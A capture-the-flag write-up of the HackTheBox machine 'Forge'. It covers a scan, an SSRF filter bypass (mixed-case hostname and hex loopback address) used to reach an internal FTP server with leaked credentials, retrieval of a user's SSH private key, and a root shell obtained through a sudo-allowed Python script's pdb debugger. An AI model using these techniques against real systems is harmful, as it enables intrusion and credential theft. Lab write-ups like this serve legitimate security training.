# Scan

```bash
ghost@localhost [02:27:00] [~/Documents/hacking/tj-null-boxes/forge] [master]
-> % rustscan -a $IP -- -sC -sV
Open 10.10.11.111:22
Open 10.10.11.111:80

ghost@localhost [02:28:01] [~/Documents/hacking/tj-null-boxes/forge] [master]
-> % nmap -sC -sV -vvv -p 22,80 $IP

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2sK9Bs3bKpmIER8QElFzWVwM0V/pval09g7BOCYMOZihHpPeE4S2aCt0oe9/KHyALDgtRb3++WLuaI6tdYA1k4bhZU/0bPENKBp6ykWUsWieSSarmd0sfekrbcqob69pUJSxIVzLrzXbg4CWnnLh/UMLc3emGkXxjLOkR1APIZff3lXIDr8j2U3vDAwgbQINDinJaFTjDcXkOY57u4s2Si4XjJZnQVXuf8jGZxyyMKY/L/RYxRiZVhDGzEzEBxyLTgr5rHi3RF+mOtzn3s5oJvVSIZlh15h2qoJX1v7N/N5/7L1RR9rV3HZzDT+reKtdgUHEAKXRdfrff04hXy6aepQm+kb4zOJRiuzZSw6ml/N0ITJy/L6a88PJflpctPU4XKmVX5KxMasRKlRM4AMfzrcJaLgYYo1bVC9Ik+cCt7UjtvIwNZUcNMzFhxWFYFPhGVJ4HC0Cs2AuUC8T0LisZfysm61pLRUGP7ScPo5IJhwlMxncYgFzDrFRig3DlFQ0=
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH67/BaxpvT3XsefC62xfP5fvtcKxG2J2di6u8wupaiDIPxABb5/S1qecyoQJYGGJJOHyKlVdqgF1Odf2hAA69Y=
|   256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILcTSbyCdqkw29aShdKmVhnudyA2B6g6ULjspAQpHLIC
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://forge.htb
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# port 80 (Apache)

```bash
ghost@localhost [02:46:59] [~/Documents/hacking/tj-null-boxes/forge] [master *]
-> % cat feroxbuster.out -p
200      GET       72l       92w     2050c http://forge.htb/
301      GET        4l       24w      224c http://forge.htb/uploads => http://forge.htb/uploads/
200      GET       33l       58w      929c http://forge.htb/upload
301      GET        9l       28w      307c http://forge.htb/static => http://forge.htb/static/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://forge.htb/static (Apache)
403      GET        9l       28w      274c http://forge.htb/server-status
```

From poking around the service, I found out that it is running Python server.

# Finding vhost

From gobuster result, I found http://admin.forge.htb but since it cannot be accessed directly, it is access via `Upload from url` from forge.htb/upload 

# Server side request forgery

From http://admin.forge.htb I found the following page

```bash
ghost@localhost [00:25:47] [~/Documents/hacking/tj-null-boxes/forge] [master *]
-> % curl http://forge.htb/uploads/yCrVzxwO7XXg5L04TGOV
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>%
```

Then when I check announcements, found FTP credentials, user:heightofsecurity123!

```bash
ghost@localhost [00:29:55] [~/Documents/hacking/tj-null-boxes/forge] [master *]
-> % curl http://forge.htb/uploads/48Q80VbLKK9xwTkWyUov
<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>%
```

So I do SSRF as fellow to /upload endpoint with FTP url encoded in hex.

http://adMin.fOrGe.hTb/upload?u=ftp://user:heightofsecurity123!@0x7f000001/

which gives the following result

```
ghost@localhost [00:40:31] [~/Documents/hacking/tj-null-boxes/forge] [master *]
-> % curl http://forge.htb/uploads/1rW3mEhXa8pvgSBmkdlV
drwxr-xr-x    3 1000     1000         4096 Aug 04  2021 snap
-rw-r-----    1 0        1000           33 Oct 22 16:23 user.txt
```

# user.txt

So the following request gives user flag.

http://adMin.fOrGe.hTb/upload?u=ftp://user:heightofsecurity123!@0x7f000001/user.txt

```bash
ghost@localhost [00:41:46] [~/Documents/hacking/tj-null-boxes/forge] [master *]
-> % curl http://forge.htb/uploads/PriJijmDcvVO7XOsZpku
fdda9***
```

But to gain access, I check the `.ssh` directory of the user

```bash
ghost@localhost [00:42:12] [~/Documents/hacking/tj-null-boxes/forge] [master *]
-> % curl http://forge.htb/uploads/1G3MrSMl15XXW58VUHgr
-rw-------    1 1000     1000          564 May 31  2021 authorized_keys
-rw-------    1 1000     1000         2590 May 20  2021 id_rsa
-rw-------    1 1000     1000          564 May 20  2021 id_rsa.pub

ghost@localhost [00:44:51] [~/Documents/hacking/tj-null-boxes/forge] [master *]
-> % curl http://forge.htb/uploads/wKKrCtYfgUqw37tPaSdG
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAnZIO+Qywfgnftqo5as+orHW/w1WbrG6i6B7Tv2PdQ09NixOmtHR3
...
RVFD+gXCAOBF+afizL3fm40cHECsUifh24QqUSJ5f/xZBKu04Ypad8nH9nlkRdfOuh2jQb
nR7k4+Pryk8HqgNS3/g1/Fpd52DDziDOAIfORntwkuiQSlg63hF3vadCAV3KIVLtBONXH2
shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=
-----END OPENSSH PRIVATE KEY-----

ghost@localhost [00:48:09] [~/Documents/hacking/tj-null-boxes/forge] [master *]
-> % curl http://forge.htb/uploads/HYdO7uPdghiLK6LOCEk2
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCdkg75DLB+Cd+2qjlqz6isdb/DVZusbqLoHtO/Y91DT02LE6a0dHeufEei6/j+XWk7aeM9/kZuNUcCwzAkNeYM2Nqpl8705gLsruGvsVXrGVRZOHBwqjSEg5W4TsmHV36N+kNhheo43mvoPM4MjlYzAsqX2fmtu0WSjfFot7CQdhMTZhje69WmnGycK8n/q6SvqntvNxHKBitPIQBaDmA5F+yqELcdqg7FeJeAbNNbJe1/ajjOY2Gy192BZYGkR9uAWBncNYn67bP9U5unQggoR+yBf5xZdBS3xEkCcqBNSMYCZ81Ev2cnGiZgeXJJDPbEvhRhdfNevwaYvpfT6cqtGCVo0V0LTKQtMayIazX5tzqMmIPURKJ5sBL9ksBNOxofjogT++/1c4nTmoRdEZTP5qmXMMbjBa+JI256sPL09MbEHqRHmkZsJoRahE8tUhv0SqdaHbv2Ze7RvjNiESD6fIMrq6L+euZFhQ5p2AIpdHvOUSbeaCPiG7hwVqwf8qU= user@forge
```

So from public key I found out the username is `user`

With private key, I managed to ssh into the server.

```
ghost@localhost [00:47:31] [~/Documents/hacking/tj-null-boxes/forge] [master *]
-> % ssh -i key user@forge.htb

Last login: Fri Aug 20 01:32:18 2021 from 10.10.14.6
user@forge:~$
```

# Privilege escalation

When I do `sudo -l` I found the following command can run as sudo without password.

```bash
user@forge:~$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

When I check the code, it is as below.

```python
user@forge:~$ cat /opt/remote-manage.py
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

From the code, I can see that, if there's an Exception, it will go to [ppdb.post_mortem](https://docs.python.org/3/library/pdb.html#pdb.post_mortem) and also the server password is hardcoded as `secretadminpassword`.

So first I run the server on one tab with sudo. Then to get an exception, in another session, I enter a string because the input is expecting an integer.

```bash
user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:1137


user@forge:~$ nc localhost 11375
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do:
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
PWNED


user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:11375
invalid literal for int() with base 10: b'PWNED'
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb) import os
(Pdb) os.system("/bin/bash")

root@forge:/home/user# cd ~
root@forge:~# cat root.txt
2e519***
```
